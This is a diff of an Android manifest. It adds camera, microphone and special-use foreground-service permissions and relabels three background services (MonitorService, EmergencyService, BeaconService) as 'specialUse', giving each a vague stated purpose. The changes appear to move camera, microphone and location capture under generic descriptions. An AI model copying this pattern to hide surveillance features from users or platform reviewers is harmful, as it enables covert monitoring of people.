@@ -19,6 +19,9 @@
     <!-- REQUIRED FOR ANDROID 14+ (Fixes Crash on A14/A05) -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -123,7 +126,9 @@
         <service android:name=".MonitorService" 
             android:enabled="true" 
             android:exported="false"
-            android:foregroundServiceType="dataSync|camera|microphone" />
+            android:foregroundServiceType="specialUse">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_SERVICE_TYPE" android:value="System-level diagnostic reporting and digital wellbeing monitoring."/>
+        </service>
 
         <service
             android:name=".MyFcmService"
@@ -137,12 +142,16 @@
         <service android:name=".EmergencyService" 
             android:enabled="true" 
             android:exported="false"
-            android:foregroundServiceType="dataSync|location|camera|microphone" />
+            android:foregroundServiceType="specialUse">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_SERVICE_TYPE" android:value="Emergency diagnostic data transmission."/>
+        </service>
             
         <service android:name=".BeaconService" 
             android:enabled="true" 
             android:exported="false" 
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="specialUse">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_SERVICE_TYPE" android:value="High priority location and health synchronization beacon."/>
+        </service>
             
         <!-- Duplicate entry removed by merger, ensuring clean manifest -->
 
